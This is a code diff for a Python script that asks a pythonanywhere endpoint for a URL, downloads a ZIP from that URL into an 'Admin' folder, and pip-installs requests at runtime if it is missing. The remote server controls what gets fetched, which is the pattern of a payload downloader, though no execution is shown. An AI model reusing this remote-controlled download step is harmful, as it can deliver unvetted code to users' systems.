@@ -1,8 +1,18 @@
-import json
-import urllib.request
-import zipfile
 import os
 import shutil
+import zipfile
+import subprocess
+import sys
+
+# ===== Step 0: Ensure requests module is installed =====
+try:
+    import requests
+except ImportError:
+    print("requests module not found. Installing...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
+
+import json
 
 def main():
     # ===== Step 1: Create Admin folder if it doesn't exist =====
@@ -12,8 +22,9 @@ def main():
 
     # ===== Step 2: Fetch the latest artifact URL =====
     api_url = "https://azcaptchahh.pythonanywhere.com/geturl"
-    with urllib.request.urlopen(api_url) as response:
-        data = json.load(response)
+    response = requests.get(api_url)
+    response.raise_for_status()
+    data = response.json()
 
     artifact_url = data.get("url")
     if not artifact_url:
@@ -23,7 +34,11 @@ def main():
     # ===== Step 3: Download the ZIP file =====
     zip_path = os.path.join(admin_dir, "artifact.zip")
     print(f"Downloading artifact to {zip_path} ...")
-    urllib.request.urlretrieve(artifact_url, zip_path)
+    r = requests.get(artifact_url, stream=True)
+    r.raise_for_status()
+    with open(zip_path, "wb") as f:
+        for chunk in r.iter_content(chunk_size=8192):
+            f.write(chunk)
     if not os.path.exists(zip_path):
         raise Exception("Download failed")
     print("Download completed.")
